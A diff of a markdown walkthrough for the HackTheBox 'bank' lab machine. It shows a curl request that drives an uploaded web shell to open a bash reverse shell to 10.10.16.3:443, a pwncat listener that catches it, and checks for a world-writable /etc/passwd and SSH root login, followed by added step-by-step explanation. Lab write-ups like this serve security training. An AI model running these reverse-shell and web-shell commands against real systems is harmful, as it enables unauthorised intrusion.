@@ -711,17 +711,17 @@ www-data
 
 ```bash
 # rs with below curl command
-curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"'
+$ curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"'
 
 -------------------------------------------------------------------------------
 
 # install pwncat
-sudo apt install pwncat -y
+$ sudo apt install pwncat -y
 
 -------------------------------------------------------------------------------
 
 # pwncat listening at 443 and you get the foothold as www-data user
-pwncat -l 443              
+$ pwncat -l 443              
 bash: cannot set terminal process group (1071): Inappropriate ioctl for device
 bash: no job control in this shell
 
@@ -762,11 +762,36 @@ www-data@bank:/var/www/bank/uploads$ ls -l /etc/passwd
 ls -l /etc/passwd 
 -rw-rw-rw- 1 root root 1252 May 28  2017 /etc/passwd
 
+-------------------------------------------------------------------------------
+
 # check the sshd config for any attack surface
-grep PermitRootLogin /etc/ssh/sshd_config  
+$ grep PermitRootLogin /etc/ssh/sshd_config  
 #PermitRootLogin without-password
 PermitRootLogin yes
 # the setting of "PermitRootLogin without-password".
+
 ```
+
+This sequence of commands and actions depicts steps taken during a penetration testing exercise against a target system (`bank.htb`). Let's review each step:
+
+1. **Reverse Shell Command**:
+   - The `curl` command is used to send a payload to a potentially vulnerable endpoint (`http://bank.htb/uploads/implant.png.htb`). The payload is designed to execute a reverse shell back to the attacker's machine by using the `bash -c` command and redirecting input and output to a specified IP address and port (`10.10.16.3:443`).
+
+2. **Installation of Pwncat**:
+   - The `pwncat` tool is installed using the system package manager (`apt`). `pwncat` is a utility for handling reverse shell connections and is commonly used in penetration testing scenarios.
+
+3. **Listening for Reverse Shell**:
+   - `pwncat` is configured to listen on port `443` for an incoming reverse shell connection. Upon successful connection, the shell is obtained as the `www-data` user.
+
+4. **Finding SUID Binaries**:
+   - The `find` command is utilised to search for files with the SUID (Set User ID) bit set across the filesystem. The output reveals several binaries with the SUID bit set, including `/var/htb/bin/emergency`, which could potentially be used for privilege escalation.
+
+5. **Checking Permissions on `/etc/passwd`**:
+   - The permissions of the `/etc/passwd` file are inspected, indicating that it is writable by all users (`rw-rw-rw-`). This misconfiguration could allow unauthorised modification of user account information.
+
+6. **Inspecting SSHD Configuration**:
+   - The `sshd_config` file is examined to check the configuration related to SSH login. The output shows that `PermitRootLogin` is set to `yes`, which allows root login via SSH. This configuration could pose a security risk if not properly managed.
+
+It's a systematic approach to identifying vulnerabilities and potential attack vectors during a penetration testing engagement. Further steps may involve exploiting discovered vulnerabilities to escalate privileges and gain deeper access to the target system.
 
 ## Exploits
